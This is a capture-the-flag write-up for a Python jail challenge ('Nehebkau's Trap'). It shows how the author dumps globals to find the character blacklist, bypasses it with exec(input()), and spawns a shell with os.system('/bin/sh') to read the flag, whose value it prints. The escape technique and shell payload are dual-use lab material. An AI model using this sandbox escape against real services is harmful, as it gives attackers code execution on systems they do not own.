# Nehebkaus Trap
## Description
In search of the ancient relic, you go looking for the Pharaoh's tomb inside the pyramids. A giant granite block falls and blocks your exit, and the walls start closing in! You are trapped. Can you make it out alive and continue your quest?

### Difficulty: medium
---
Connecting to the nc link, we find that it's a trap:
```
 nc 104.248.169.117 32684
    __
   {00}                                                                                                             
   \__/                                                                                                             
   /^/                                                                                                              
  ( (                                                                                                               
   \_\_____                                                                                                         
   (_______)                                                                                                        
  (_________()Ooo.                                                                                                  
                                                                                                                    
[ Nehebkau's Trap ]                                                                                                 
                                                                                                                    
You are trapped!                                                                                                    
Can you escape?
>
```

Various shell commands do not work, and we quickly find that several critical inputs are blacklisted, such as single and double quotes, or dots.
The snake is our first subtle hint, we are likely trapped in a python jail! There is a posting on [hacktricks that covers this type of problem](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes). Unfortunately, most of the suggestions will not work for us with restrictions on dot, quotes, space and even uderscores. We can, however, print the globals and locals:
```
> print(globals())                                                                                                  
                                                                                                                    
[*] Input accepted!                                                                                                 
                                                                                                                    
{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f37eeb47c10>, '__spec__': None, '__annotations__': {}, '__builtins__': <module 'builtins' (built-in)>, '__file__': '/home/ctf/./jail.py', '__cached__': None, 'sys': <module 'sys' (built-in)>, 'time': <module 'time' (built-in)>, 'BLACKLIST': ('.', '_', '/', '"', ';', ' ', "'", ','), 'Color': <class '__main__.Color'>, '_print': <function _print at 0x7f37eeba3d90>, 'banner': <function banner at 0x7f37eeae2c20>, 'loop': <function loop at 0x7f37eeae2cb0>, '_': 2}

> print(locals())                                                                                                   
                                                                                                                    
[*] Input accepted!                                                                                                 
                                                                                                                    
{'banned': [], 'inp': 'print(locals())'}
```

If it wasn't found through trial and error yet, we can see the full list of blacklisted characters here:
```
BLACKLIST': ('.', '_', '/', '"', ';', ' ', "'", ',')
```
Under `globals` we find builtins is present. We must rely on these builtin functions to escape the jail and find our flag. A list of builtin functions can be found [here](https://docs.python.org/3/library/functions.html). Input() caught my eye, as perhaps we can supply stdin that might not be checked through the blacklist:
```
> a=input()                                                                                                         
                                                                                                                    
[*] Input accepted!                                                                                                 
                                                                                                                    
Error: invalid syntax (<string>, line 1)
```
Unfortunately, I received an error before being able to input anything for variable declaration. However, trying `input()` on its own seems to work as I expected:
```
> input()                                                                                                           
                                                                                                                    
[*] Input accepted!                                                                                                 
                                                                                                                    
'"'"Test aWE$%                                                                                                      
>
```
Here we see no blacklist notice despite putting several blacklisted characters. Perhaps we can use input in a different way? Next I tried `input` in combination with `exec`:

```
> exec(input())                                                                                                     
                                                                                                                    
[*] Input accepted!                                                                                                 
                                                                                                                    
print("This is a test.")                                                                                            
This is a test.
>
```
The print worked, and again no notice on blacklisted functions. From here there are several ways to read a flag. Since I wasn't sure what the flag was named or where it might be, I decided to create a shell session using a [gtfobins](https://gtfobins.github.io/) payload:
```
> exec(input())                                                                                                     
                                                                                                                    
[*] Input accepted!                                                                                                 
                                                                                                                    
import os; os.system("/bin/sh")

whoami
ctf  

ls                                                                                                                  
flag.txt                                                                                                            
jail.py 

cat flag.txt                                                                                                        
HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}
```
`HTB{y0u_d3f34t3d_th3_sn4k3_g0d!}`
